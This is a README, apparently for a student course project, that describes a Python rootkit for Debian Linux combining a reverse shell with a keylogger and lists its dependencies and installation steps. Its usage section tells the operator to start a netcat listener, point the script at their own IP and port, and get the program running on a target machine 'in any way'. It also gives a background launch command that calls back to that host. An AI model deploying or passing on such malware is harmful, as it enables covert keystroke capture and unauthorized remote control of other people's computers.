<h1>KEYLOGGER - A rootkit</h1>
<strong>This program is created for educational uses only</strong>

<h3>Authors</h3>
Matthías Dan Flemmingsson<br>
Þorsteinn Sæmundsson<br>
Úlfur Þór Þráinsson

<h3>Description</h3>
Basic rootkit with reverse shell and keylogger on a file system level for Linux(debian).<br>
Project is done as a final project at the university of Iceland for the class Öryggi tölvukerfa(HBV602M)<br>
Program assumes that its run on a Linux(debian) distrobution. Untested or will not run on other operating systems or distrobutions<br>

<h3>Installation - No virtualenviroment</h3>
Have a running version of Python 2.7<br>
Install pip, sudo apt install python-pip<br>
Install python-xlib, pip install python-xlib<br>
Install pyxhook, pip install pyxhook<br>

<h3>Installation - virtualenviroment</h3>
Install pip
Install virtualenviroment, sudo apt-get install virtualenv
Setup virtualenv in a folder, virtualenv -p python2 VENV
Start VENV, source VENV/bin/activate
Install dependencies, pip install -r requirements.txt

<h3>How to use</h3>
Start a netcat on your computer with your ip and some open unused port. Edit startRoot.sh to your ip and same port as it is set to loopback and port 12346 by default.<br>
Open program on target machine in any way(Or local machine), just get it to run.<br>
You can also run the rootkit with "nohup python rootkit.py (IP) (Port) &" if you want to do this manually.<br>

<h3>Some tips for troubleshooting</h3>
If you cant run the program without shellscript orthe shellscript itself wont run do:<br>
1. chmod +x startRoot.sh<br>
2. chmod +x rootkit.py<br>
3. chmod +x keylogger.py<br>
This should get things running for all methods starting the program<br>

<h3>Dependencies</h3>
-Python 2.7<br>
-Pip for python<br>
-python-xlib(pip)<br>
-pyxhook(pip)<br>
-(option)Virtualenv for ease of install of the above, use requirements.txt
